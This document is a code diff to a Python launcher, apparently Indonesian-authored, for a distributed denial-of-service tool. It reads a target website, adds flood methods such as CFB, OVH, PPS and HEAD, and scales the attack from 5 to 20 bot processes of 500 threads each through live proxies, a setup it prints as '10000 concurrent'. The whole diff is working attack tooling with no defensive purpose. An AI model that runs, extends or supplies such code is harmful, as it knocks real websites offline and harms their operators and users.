@@ -1,6 +1,6 @@
 import os, random, subprocess, time, sys
 
-method = ["CFB", "GET", "POST", "OVH", "STRESS", "BRUST"]
+method = ["CFB", "GET", "POST", "OVH", "STRESS", "BRUST", "DYN", "HEAD", "PPS", "EVEN"]
 
 def gas():
     if os.path.exists('target.txt'):
@@ -13,19 +13,20 @@ def gas():
     else:
         target_site = input('Target      : ')
 
-    proxy_types = '5'
-    print('Proxy_Type  : 5')
+    proxy_types = '1'
+    print('Proxy_Type  : 1 (HTTP CONNECT — tested alive)')
 
-    jumlah_bot = 5
-    print('Jumlah Bot  : 5')
+    jumlah_bot = 20
+    threads = '500'
+    print(f'Jumlah Bot  : {jumlah_bot} x {threads} threads = 10000 concurrent')
 
     processes = []
     for _ in range(jumlah_bot):
         bot_method = random.choice(method).lower()
         cmd = [
             sys.executable, 'gaskeun.py',
-            bot_method, target_site, proxy_types, '150',
-            f'proxy_bot_{_}.txt', '100', '1000'
+            bot_method, target_site, proxy_types, threads,
+            'alive.txt', '200', '1000'
         ]
         print(f'Memulai bot {_} dengan metode: {bot_method}')
         p = subprocess.Popen(cmd)
